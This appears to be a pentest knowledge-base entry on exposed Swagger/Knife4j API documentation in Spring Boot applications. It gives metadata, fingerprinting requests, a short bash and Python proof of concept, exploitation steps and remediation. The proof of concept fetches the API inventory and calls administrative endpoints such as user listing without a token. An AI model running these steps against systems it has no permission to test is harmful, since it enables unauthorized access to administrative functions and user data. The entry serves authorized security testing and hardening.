---
id: "swagger-knife4j-unauth"
title: "Exposed Swagger / Knife4j API documentation → direct calls to unauthenticated endpoints"
kind: "configuration"
cve: null
related-cves: null
cve-note: "None (configuration flaw)"
severity: "high"
cvss: 8.3
severity-basis: "cvss"
severity-note: null
product: "Spring Boot ecosystem (swagger2/3, knife4j, springdoc)"
versions: "Any"
ports: "80, 443, 8080"
keywords: "swagger, knife4j, springdoc, documentation, unauthenticated access, api"
entry: "/v2/api-docs  /doc.html  /swagger-ui/index.html"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (configuration flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /v2/api-docs            → 200 JSON
GET /v3/api-docs            → 200 JSON
GET /doc.html               → knife4j page
GET /swagger-ui/index.html  → swagger page
```

## Prerequisites

- Documentation endpoints are not disabled in production.

## PoC

```bash
# 1) Retrieve the full endpoint inventory
for p in /v2/api-docs /v3/api-docs /v2/api-docs?group=default /doc.html; do
  echo "== $p"; curl -s -o /tmp/d.json -w '%{http_code} %{size_download}\n' "https://target$p"
done

# 2) Extract paths and parameters
python3 - <<'PY'
import json
d=json.load(open('/tmp/d.json'))
for p,ops in d.get('paths',{}).items():
    for m in ops: print(m.upper(), p)
PY

# 3) Select "administrative" endpoints and call them directly (without a token)
curl -s 'https://target/api/admin/user/list?page=1' | head -c 200
# Confirmation: 200 with data = unauthenticated access
```

## Exploitation Steps

1. First retrieve documentation (read-only);
2. Filter paths for `admin|manage|export|reset|withdraw|balance`;
3. Make one pass without a token, then another with an ordinary member token;
4. Success means unauthenticated access across multiple endpoints—state the number of callable write endpoints in the report;
5. Evidence: documentation 200 response + one unauthenticated endpoint response.

## Remediation and Mitigation

- Disable swagger/knife4j in production (`springfox.documentation.enabled=false`); restrict documentation to the internal network;
- Enforce consistent gateway authorization rather than relying on frontend hiding.

## References

- OWASP API8 Security Misconfiguration.
